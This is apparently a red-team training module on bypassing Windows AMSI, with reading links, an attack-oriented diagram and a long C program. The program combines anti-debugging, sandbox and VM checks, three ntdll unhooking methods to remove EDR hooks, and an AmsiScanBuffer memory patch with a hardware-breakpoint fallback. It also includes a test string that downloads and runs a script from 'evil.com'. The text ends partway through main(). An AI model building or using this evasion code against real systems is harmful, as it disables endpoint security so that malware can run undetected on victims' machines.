## Day 2: AMSI Bypass and Script-Based Attack Techniques

- **Goal**: Master AMSI internals and implement multiple bypass techniques for script-based attacks.
- **Activities**:
  - _Reading_:
    - [AMSI Documentation](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
    - [AMSI How It Works](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
    - [RastaMouse - AMSI Bypass Analysis](https://rastamouse.me/memory-patching-amsi-bypass/)
  - _Online Resources_:
    - [Introduction to Sandbox Evasion and AMSI Bypasses](https://www.youtube.com/watch?v=F_BvtXzH4a4)
    - [Blind EDR with Windows Symbolic Link](https://www.zerosalarium.com/2025/01/byovd%20next%20level%20blind%20EDR%20windows%20symbolic%20link.html)
    - [S3cur3Th1sSh1t - AMSI Bypass Compilation](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
    - [AMSITrigger Tool](https://github.com/RythmStick/AMSITrigger) - Find AMSI trigger strings

### Context: Why AMSI Matters for Red Teams

AMSI scans PowerShell, JavaScript, VBScript, and .NET assembly loads in real-time. Before AMSI, attackers could execute obfuscated malicious scripts that bypassed static file scanning. AMSI closed this gap - now we need to bypass it.

### Deliverables

- [ ] Understand AMSI architecture and scan flow
- [ ] Implement multiple AMSI bypass techniques
- [ ] Use AMSITrigger to identify detection triggers
- [ ] Build a custom AMSI bypass for your payload

### AMSI Architecture (Attack Perspective)

```text
┌─────────────────────────────────────────────────────────────────┐
│                    AMSI Scan Flow                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PowerShell.exe (your payload)                                  │
│        │                                                        │
│        ▼                                                        │
│  ┌─────────────────┐                                            │
│  │ amsi.dll        │  <- Loaded into every script host process  │
│  │                 │                                            │
│  │ AmsiInitialize()│  <- Creates AMSI context                   │
│  │ AmsiScanBuffer()│  <- Scans script content <- PATCH TARGET   │
│  │ AmsiScanString()│  <- Scans strings                          │
│  └─────────────────┘                                            │
│        │                                                        │
│        ▼                                                        │
│  ┌──────────────┐                                               │
│  │ Windows      │                                               │
│  │ Defender     │  <- Receives scan request, returns verdict    │
│  └──────────────┘                                               │
│        │                                                        │
│        ▼                                                        │
│  AMSI_RESULT:                                                   │
│  - AMSI_RESULT_CLEAN (0)      -> Execute allowed                │
│  - AMSI_RESULT_DETECTED (32768) -> Block execution              │
│                                                                 │
│  BYPASS STRATEGIES:                                             │
│  1. Patch AmsiScanBuffer to return CLEAN                        │
│  2. Corrupt AMSI context (amsiContext)                          │
│  3. Unhook/unload amsi.dll                                      │
│  4. Obfuscate payload to avoid signatures                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1. Multi-Stage Bypass

```c
// amsi_bypass_multi.c
// Compile: cl src\amsi_bypass_multi.c /Fe:bin\amsi_bypass_multi.exe /MT wininet.lib
// Usage: .\bin\amsi_bypass_multi.exe --no-checks (for VMs/testing)

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <intrin.h>
#include <psapi.h>
#include <wininet.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")

// AMSI definitions
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768
} AMSI_RESULT;

typedef void* HAMSICONTEXT;
typedef void* HAMSISESSION;

typedef struct _ANTI_ANALYSIS_CTX {
    BOOL is_debugged;
    BOOL is_sandbox;
    BOOL is_vm;
    DWORD time_delta;
} ANTI_ANALYSIS_CTX;

typedef struct _SYSCALL_ENTRY {
    DWORD syscall_number;
    PVOID function_address;
    WCHAR* function_name;
} SYSCALL_ENTRY;

typedef struct _HWBP_CTX {
    HANDLE thread_handle;
    CONTEXT ctx;
    DWORD64 original_amsi_addr;
    BYTE original_bytes[16];
} HWBP_CTX;

static ANTI_ANALYSIS_CTX g_anti_ctx = {0};
static HWBP_CTX g_hwbp_ctx = {0};
static BOOL g_bypass_active = FALSE;
static BOOL g_skip_anti_analysis = FALSE;  // Flag to skip anti-analysis checks

BOOL CheckDebuggerPresence() {
    BOOL is_remote_debugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_remote_debugger);

    PVOID peb = (PVOID)__readgsqword(0x60);
    DWORD nt_global_flag = *(DWORD*)((BYTE*)peb + 0xBC);
    BOOL is_debugged_nt = (nt_global_flag & 0x70) != 0;

    HANDLE heap = GetProcessHeap();
    DWORD heap_flags = *(DWORD*)((BYTE*)heap + 0x70);
    BOOL is_debugged_heap = (heap_flags & 2) != 0;

    return is_remote_debugger || is_debugged_nt || is_debugged_heap;
}

BOOL CheckSandboxEnvironment() {
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);

    WCHAR sandbox_files[][MAX_PATH] = {
        L"\\drivers\\vboxdrv.sys",
        L"\\drivers\\VBoxMouse.sys",
        L"\\drivers\\VBoxGuest.sys",
        L"\\drivers\\vmware.sys",
        L"\\drivers\\vmx86.sys"
    };

    for (int i = 0; i < 5; i++) {
        WCHAR full_path[MAX_PATH];
        wcscpy_s(full_path, MAX_PATH, system32);
        wcscat_s(full_path, MAX_PATH, sandbox_files[i]);

        if (GetFileAttributesW(full_path) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            WCHAR* sandbox_processes[] = {
                L"vboxservice.exe",
                L"vboxtray.exe",
                L"vmtoolsd.exe",
                L"vmwareuser.exe",
                L"procmon.exe",
                L"wireshark.exe"
            };

            for (int i = 0; i < 6; i++) {
                if (_wcsicmp(pe32.szExeFile, sandbox_processes[i]) == 0) {
                    CloseHandle(snapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return FALSE;
}

BOOL CheckVMEnvironment() {
    int cpuid_result[4];
    __cpuid(cpuid_result, 1);
    BOOL hypervisor_present = (cpuid_result[2] & 0x80000000) != 0;

    __cpuid(cpuid_result, 0x40000000);
    BOOL hypervisor_leaf = cpuid_result[0] >= 0x40000000;

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    return hypervisor_present || hypervisor_leaf;
}

BOOL GetWebServerTime(SYSTEMTIME* serverTime) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    // Use a reliable time server
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://www.google.com", NULL, 0,
                                          INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Get Date header from HTTP response
    char dateBuffer[128];
    DWORD bufferSize = sizeof(dateBuffer);
    DWORD index = 0;

    if (HttpQueryInfoA(hConnect, HTTP_QUERY_DATE, dateBuffer, &bufferSize, &index)) {
        // Parse HTTP date format: "Day, DD Mon YYYY HH:MM:SS GMT"
        // Example: "Wed, 21 Oct 2015 07:28:00 GMT"

        SYSTEMTIME st = {0};
        char monthStr[4] = {0};
        char dayStr[4] = {0};
        int day, year, hour, minute, second;

        // Parse into int first, then convert to WORD
        sscanf_s(dateBuffer, "%*3s, %d %3s %d %d:%d:%d",
                 &day, monthStr, 4, &year, &hour, &minute, &second);

        st.wDay = (WORD)day;
        st.wYear = (WORD)year;
        st.wHour = (WORD)hour;
        st.wMinute = (WORD)minute;
        st.wSecond = (WORD)second;

        // Convert month string to number
        const char* months[] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun",
                               "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
        for (int i = 0; i < 12; i++) {
            if (strcmp(monthStr, months[i]) == 0) {
                st.wMonth = i + 1;
                break;
            }
        }

        *serverTime = st;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return TRUE;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return FALSE;
}

DWORD SystemTimeDiffMs(SYSTEMTIME* st1, SYSTEMTIME* st2) {
    FILETIME ft1, ft2;
    ULARGE_INTEGER uli1, uli2;

    SystemTimeToFileTime(st1, &ft1);
    SystemTimeToFileTime(st2, &ft2);

    uli1.LowPart = ft1.dwLowDateTime;
    uli1.HighPart = ft1.dwHighDateTime;
    uli2.LowPart = ft2.dwLowDateTime;
    uli2.HighPart = ft2.dwHighDateTime;

    ULONGLONG diff = (uli2.QuadPart - uli1.QuadPart) / 10000; // Convert to milliseconds
    return (DWORD)diff;
}

VOID InitializeAntiAnalysis() {
    if (g_skip_anti_analysis) {
        printf("[*] Anti-analysis checks SKIPPED (--no-checks flag)\n");
        return;
    }

    g_anti_ctx.is_debugged = CheckDebuggerPresence();
    g_anti_ctx.is_sandbox = CheckSandboxEnvironment();
    g_anti_ctx.is_vm = CheckVMEnvironment();

    printf("[*] Checking for time manipulation (fetching from web server)...\n");

    SYSTEMTIME webTime1, webTime2;
    BOOL useWebTime = GetWebServerTime(&webTime1);

    if (useWebTime) {
        printf("[+] Got initial web server time\n");
        Sleep(2000);  // Sleep for 2 seconds

        if (GetWebServerTime(&webTime2)) {
            g_anti_ctx.time_delta = SystemTimeDiffMs(&webTime1, &webTime2);
            printf("[+] Web server time delta: %dms (expected ~2000ms)\n", g_anti_ctx.time_delta);

            // If time delta is way off, sandbox is manipulating time
            if (g_anti_ctx.time_delta < 1500 || g_anti_ctx.time_delta > 3000) {
                printf("[!] Time manipulation detected (web server check)\n");
                g_anti_ctx.is_sandbox = TRUE;
            }
        } else {
            printf("[-] Failed to get second web time, falling back to local check\n");
            useWebTime = FALSE;
        }
    }

    if (!useWebTime) {
        printf("[*] Using local time check (less reliable)\n");
        DWORD start_time = GetTickCount();
        Sleep(100);
        DWORD end_time = GetTickCount();
        g_anti_ctx.time_delta = end_time - start_time;
        printf("[*] Local time delta: %dms (expected ~100ms)\n", g_anti_ctx.time_delta);
    }

    printf("\n[*] Anti-analysis results:\n");
    printf("    Debugger: %s\n", g_anti_ctx.is_debugged ? "DETECTED" : "Not detected");
    printf("    Sandbox: %s\n", g_anti_ctx.is_sandbox ? "DETECTED" : "Not detected");
    printf("    VM: %s\n", g_anti_ctx.is_vm ? "DETECTED" : "Not detected");
    printf("    Time check: %s\n", useWebTime ? "Web server (reliable)" : "Local (unreliable)");

    if (g_anti_ctx.is_debugged || g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) {
        printf("[!] Analysis environment detected - exiting for safety\n");
        printf("[*] Use --no-checks flag to bypass this protection\n");
        ExitProcess(0);
    }
}

DWORD GetSyscallNumber(const WCHAR* function_name) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    // Convert wide string to ANSI for GetProcAddress
    char function_name_ansi[256];
    WideCharToMultiByte(CP_ACP, 0, function_name, -1, function_name_ansi, sizeof(function_name_ansi), NULL, NULL);

    BYTE* function_addr = (BYTE*)GetProcAddress(ntdll, function_name_ansi);
    if (!function_addr) return 0;

    for (int i = 0; i < 20; i++) {
        if (function_addr[i] == 0x48 && function_addr[i+1] == 0xB8) {
            return *(DWORD*)&function_addr[i+2];
        }
    }

    return 0;
}

PVOID GetIndirectSyscallStub(const WCHAR* function_name) {
    PVOID stub = VirtualAlloc(NULL, 0x20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub) return NULL;

    DWORD syscall_num = GetSyscallNumber(function_name);
    if (syscall_num == 0) {
        VirtualFree(stub, 0, MEM_RELEASE);
        return NULL;
    }

    BYTE* code = (BYTE*)stub;
    *code++ = 0x48; *code++ = 0xB8;  // mov rax, imm64
    *(DWORD*)code = syscall_num; code += 4;
    *code++ = 0x00; *code++ = 0x00; *code++ = 0x00; *code++ = 0x00;
    *code++ = 0x0F; *code++ = 0x05;  // syscall
    *code++ = 0xC3;  // ret

    return stub;
}

BOOL UnhookNtdll() {
    WCHAR ntdll_path[MAX_PATH];
    GetSystemDirectoryW(ntdll_path, MAX_PATH);
    wcscat_s(ntdll_path, MAX_PATH, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdll_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* file_data = HeapAlloc(GetProcessHeap(), 0, file_size);
    if (!file_data) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytes_read;
    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
        HeapFree(GetProcessHeap(), 0, file_data);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)file_data;
    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(file_data + dos_hdr->e_lfanew);

    HMODULE ntdll_base = GetModuleHandleW(L"ntdll.dll");

    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)(nt_hdr + 1);
    for (int i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            BYTE* loaded_text = (BYTE*)ntdll_base + sections[i].VirtualAddress;
            BYTE* disk_text = file_data + sections[i].PointerToRawData;

            DWORD old_protect;
            VirtualProtect(loaded_text, sections[i].SizeOfRawData,
                          PAGE_EXECUTE_READWRITE, &old_protect);

            memcpy(loaded_text, disk_text, sections[i].SizeOfRawData);

            VirtualProtect(loaded_text, sections[i].SizeOfRawData,
                          old_protect, &old_protect);
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, file_data);
    return TRUE;
}

BOOL UnhookNtdllFromKnownDlls() {
    printf("[*] Attempting KnownDlls unhooking method...\n");

    HANDLE hSection = NULL;
    PVOID pCleanNtdll = NULL;
    SIZE_T viewSize = 0;

    // NT API function pointers
    typedef NTSTATUS (NTAPI *NtOpenSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                                    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
    typedef VOID (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

    NtOpenSection_t pNtOpenSection = (NtOpenSection_t)GetProcAddress(ntdll, "NtOpenSection");
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    RtlInitUnicodeString_t pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");

    if (!pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection || !pRtlInitUnicodeString) {
        printf("[-] Failed to get NT API functions\n");
        return FALSE;
    }

    // Open the KnownDlls section object
    UNICODE_STRING sectionName;
    pRtlInitUnicodeString(&sectionName, L"\\KnownDlls\\ntdll.dll");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("[-] NtOpenSection failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Opened KnownDlls\\ntdll.dll section\n");

    // Map the clean ntdll into our process
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pCleanNtdll,
                                 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);

    if (status != 0) {
        printf("[-] NtMapViewOfSection failed: 0x%X\n", status);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Mapped clean ntdll at: 0x%p\n", pCleanNtdll);

    // Copy .text section from clean ntdll to hooked ntdll
    HMODULE hookedNtdll = GetModuleHandleW(L"ntdll.dll");

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + dosHdr->e_lfanew);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHdr);
    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            DWORD oldProtect;
            BYTE* dest = (BYTE*)hookedNtdll + sections[i].VirtualAddress;
            BYTE* src = (BYTE*)pCleanNtdll + sections[i].VirtualAddress;

            VirtualProtect(dest, sections[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(dest, src, sections[i].Misc.VirtualSize);
            VirtualProtect(dest, sections[i].Misc.VirtualSize, oldProtect, &oldProtect);

            printf("[+] Restored .text section (%d bytes)\n", sections[i].Misc.VirtualSize);
            break;
        }
    }

    pNtUnmapViewOfSection(GetCurrentProcess(), pCleanNtdll);
    CloseHandle(hSection);

    printf("[+] KnownDlls unhooking complete\n");
    return TRUE;
}

BOOL UnhookNtdllFromSuspendedProcess() {
    printf("[*] Attempting suspended process unhooking method...\n");

    // Create a suspended process (any legitimate Windows binary)
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
                       FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Created suspended process (PID: %d)\n", pi.dwProcessId);

    // Get ntdll base address in our process
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    // Read the clean ntdll from suspended process memory
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHdr);
    BOOL success = FALSE;

    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            BYTE* cleanText = (BYTE*)malloc(sections[i].Misc.VirtualSize);
            if (!cleanText) break;

            SIZE_T bytesRead;

            // Read clean .text section from suspended process
            BYTE* remoteAddr = (BYTE*)hNtdll + sections[i].VirtualAddress;
            if (ReadProcessMemory(pi.hProcess, remoteAddr, cleanText,
                                 sections[i].Misc.VirtualSize, &bytesRead)) {

                printf("[+] Read %zu bytes from suspended process\n", bytesRead);

                // Write to our hooked ntdll
                DWORD oldProtect;
                BYTE* localAddr = (BYTE*)hNtdll + sections[i].VirtualAddress;
                VirtualProtect(localAddr, sections[i].Misc.VirtualSize,
                             PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(localAddr, cleanText, sections[i].Misc.VirtualSize);
                VirtualProtect(localAddr, sections[i].Misc.VirtualSize,
                             oldProtect, &oldProtect);

                printf("[+] Restored .text section from clean copy\n");
                success = TRUE;
            } else {
                printf("[-] ReadProcessMemory failed: %d\n", GetLastError());
            }

            free(cleanText);
            break;
        }
    }

    // Clean up - terminate the suspended process
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (success) {
        printf("[+] Suspended process unhooking complete\n");
    }

    return success;
}

LONG CALLBACK HardwareBypassHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)g_hwbp_ctx.original_amsi_addr) {
            ExceptionInfo->ContextRecord->Rax = 0x80070057;  // E_INVALIDARG
            ExceptionInfo->ContextRecord->Rip += 3;  // Skip original instruction

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL SetHardwareBreakpointBypass() {
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan) {
        printf("[-] Failed to get AmsiScanBuffer address\n");
        return FALSE;
    }

    printf("[*] AmsiScanBuffer address: 0x%p\n", amsi_scan);

    g_hwbp_ctx.original_amsi_addr = (DWORD64)amsi_scan;

    g_hwbp_ctx.thread_handle = GetCurrentThread();
    g_hwbp_ctx.ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(g_hwbp_ctx.thread_handle, &g_hwbp_ctx.ctx)) {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    g_hwbp_ctx.ctx.Dr0 = (DWORD64)amsi_scan;
    g_hwbp_ctx.ctx.Dr7 = (1 << 0) | (3 << 16);  // Enable DR0, execute breakpoint

    if (!SetThreadContext(g_hwbp_ctx.thread_handle, &g_hwbp_ctx.ctx)) {
        printf("[-] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!AddVectoredExceptionHandler(1, HardwareBypassHandler)) {
        printf("[-] AddVectoredExceptionHandler failed\n");
        return FALSE;
    }

    printf("[+] Hardware breakpoint set at 0x%p\n", amsi_scan);
    return TRUE;
}

BOOL BypassAmsiAdvanced() {
    printf("[*] Initializing anti-analysis checks...\n");
    InitializeAntiAnalysis();

    printf("[*] Unhooking ntdll to remove EDR hooks...\n");

    BOOL unhook_success = FALSE;

    // Method 1: Suspended process
    if (UnhookNtdllFromSuspendedProcess()) {
        unhook_success = TRUE;
        printf("[+] Used suspended process method\n");
    }
    // Method 2: KnownDlls
    else if (UnhookNtdllFromKnownDlls()) {
        unhook_success = TRUE;
        printf("[+] Used KnownDlls method\n");
    }
    // Method 3: Disk read
    else if (UnhookNtdll()) {
        unhook_success = TRUE;
        printf("[+] Used disk read method (fallback)\n");
    }

    if (!unhook_success) {
        printf("[-] All unhooking methods failed\n");
        return FALSE;
    }

    printf("[+] Ntdll unhooking complete\n");

    // Get AMSI function address
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan) {
        printf("[-] Failed to get AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[*] AmsiScanBuffer at: 0x%p\n", amsi_scan);

    // Try direct memory patch first (more reliable on modern Windows)
    printf("[*] Attempting direct memory patch...\n");
    DWORD old_protect;
    if (VirtualProtect(amsi_scan, 16, PAGE_EXECUTE_READWRITE, &old_protect)) {
        // Save original bytes
        memcpy(g_hwbp_ctx.original_bytes, amsi_scan, 16);

        // Patch: mov eax, 0x80070057; ret (E_INVALIDARG)
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        memcpy(amsi_scan, patch, sizeof(patch));

        VirtualProtect(amsi_scan, 16, old_protect, &old_protect);
        printf("[+] Memory patch applied successfully\n");

        g_bypass_active = TRUE;
        printf("[+] AMSI bypass activated successfully\n");
        return TRUE;
    } else {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        printf("[*] Trying hardware breakpoint method as fallback...\n");

        // Fallback to hardware breakpoint (less reliable on modern Windows)
        if (SetHardwareBreakpointBypass()) {
            g_bypass_active = TRUE;
            printf("[+] AMSI bypass activated successfully (hardware breakpoint)\n");
            return TRUE;
        } else {
            printf("[-] All AMSI bypass methods failed\n");
            return FALSE;
        }
    }
}

VOID TestAmsiBypass() {
    printf("[*] Testing AMSI bypass with actual AMSI scan...\n");

    // Load amsi.dll and get function pointers
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return;
    }

    // Function prototypes
    typedef HRESULT (WINAPI* AmsiInitialize_t)(LPCWSTR appName, HAMSICONTEXT* amsiContext);
    typedef HRESULT (WINAPI* AmsiScanBuffer_t)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);
    typedef void (WINAPI* AmsiUninitialize_t)(HAMSICONTEXT amsiContext);

    AmsiInitialize_t pAmsiInitialize = (AmsiInitialize_t)GetProcAddress(hAmsi, "AmsiInitialize");
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    AmsiUninitialize_t pAmsiUninitialize = (AmsiUninitialize_t)GetProcAddress(hAmsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanBuffer || !pAmsiUninitialize) {
        printf("[-] Failed to get AMSI function pointers\n");
        return;
    }

    // Initialize AMSI
    HAMSICONTEXT amsiContext = NULL;
    HRESULT hr = pAmsiInitialize(L"AMSIBypassTest", &amsiContext);
    if (FAILED(hr)) {
        printf("[-] AmsiInitialize failed: 0x%08X\n", hr);
        return;
    }

    // Test with known malicious string (EICAR-like for AMSI)
    const char* malicious_script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";

    printf("[*] Scanning malicious PowerShell command...\n");
    printf("    Test string: %s\n", malicious_script);

    AMSI_RESULT scanResult = AMSI_RESULT_CLEAN;
    hr = pAmsiScanBuffer(amsiContext, (PVOID)malicious_script, (ULONG)strlen(malicious_script),
                         L"PowerShellScript", NULL, &scanResult);

    printf("\n[*] AMSI Scan Results:\n");
    printf("    HRESULT: 0x%08X ", hr);

    BOOL bypass_working = FALSE;

    if (hr == 0x80070057) {  // E_INVALIDARG - our bypass return value
        printf("(E_INVALIDARG - BYPASS SUCCESSFUL!)\n");
        printf("    [+] AMSI returned E_INVALIDARG - bypass is working!\n");
        printf("    [+] Malicious content would NOT be blocked\n");
        bypass_working = TRUE;
    } else if (SUCCEEDED(hr)) {
        printf("(Success)\n");
        printf("    Scan Result: ");
        switch (scanResult) {
            case AMSI_RESULT_CLEAN:
                printf("CLEAN (0) - Bypass may be working\n");
                bypass_working = TRUE;
                break;
            case AMSI_RESULT_NOT_DETECTED:
                printf("NOT_DETECTED (1) - Bypass may be working\n");
                bypass_working = TRUE;
                break;
            case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
            case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
                printf("BLOCKED_BY_ADMIN (%d) - Admin policy blocking\n", scanResult);
                break;
            case AMSI_RESULT_DETECTED:
                printf("DETECTED (32768) - BYPASS FAILED!\n");
                printf("    [!] AMSI is still active and detecting malicious content\n");
                break;
            default:
                printf("%d\n", scanResult);
        }
    } else {
        printf("(Failed)\n");
        printf("    [!] AMSI scan failed with error\n");
    }

    // Test with AMSI test sample (guaranteed to trigger detection if AMSI is active)
    const char* amsi_test_sample = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    printf("\n[*] Scanning AMSI test sample (should always detect if AMSI active)...\n");

    scanResult = AMSI_RESULT_CLEAN;
    hr = pAmsiScanBuffer(amsiContext, (PVOID)amsi_test_sample, (ULONG)strlen(amsi_test_sample),
                         L"AMSITestSample", NULL, &scanResult);

    printf("    HRESULT: 0x%08X ", hr);
    if (hr == 0x80070057) {
        printf("(E_INVALIDARG - BYPASS CONFIRMED!)\n");
        printf("    [+] Even AMSI test sample bypassed - bypass is definitely working!\n");
        g_bypass_active = TRUE;
    } else if (SUCCEEDED(hr)) {
        printf("(Success)\n");
        if (scanResult >= AMSI_RESULT_DETECTED) {
            printf("    Result: DETECTED - BYPASS FAILED!\n");
            printf("    [!] AMSI is still active\n");
            g_bypass_active = FALSE;
        } else {
            printf("    Result: %d - Bypass may be working\n", scanResult);
            if (bypass_working) {
                g_bypass_active = TRUE;
            }
        }
    } else {
        printf("    HRESULT indicates failure\n");
        g_bypass_active = FALSE;
    }

    pAmsiUninitialize(amsiContext);
    printf("\n");
}

int main(int argc, char* argv[]) {
    printf("=== AMSI Bypass ===\n");
    printf("Multi-stage bypass with anti-analysis protection\n\n");

    // Parse command-line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-checks") == 0 || strcmp(argv[i], "-n") == 0) {
            g_skip_anti_analysis = TRUE;
            printf("[*] Anti-analysis checks disabled\n");
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
